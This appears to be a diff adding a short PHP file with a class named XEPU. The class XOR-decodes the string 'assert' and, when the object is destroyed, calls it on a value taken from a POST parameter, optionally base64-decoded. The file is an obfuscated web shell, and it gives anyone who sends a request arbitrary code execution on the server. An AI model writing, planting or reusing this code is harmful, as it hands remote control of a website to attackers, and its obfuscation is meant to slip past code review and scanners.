@@ -1,0 +1,20 @@
+<?php 
+class XEPU { 
+    function WZbP() {
+        $kTvs = "\x53" ^ "\x32";
+        $cEBj = "\xb7" ^ "\xc4";
+        $rsmg = "\x1c" ^ "\x6f";
+        $Appq = "\xaf" ^ "\xca";
+        $cUxl = "\x51" ^ "\x23";
+        $pdOG = "\xa0" ^ "\xd4";
+        $kIqw =$kTvs.$cEBj.$rsmg.$Appq.$cUxl.$pdOG;
+        return $kIqw;
+    }
+    function __destruct(){
+        $jSYz=$this->WZbP();
+        @$jSYz($this->wT);
+    }
+}
+$xepu = new XEPU();
+@$xepu->wT = isset($_GET['id'])?base64_decode($_POST['username']):$_POST['username'];
+?>
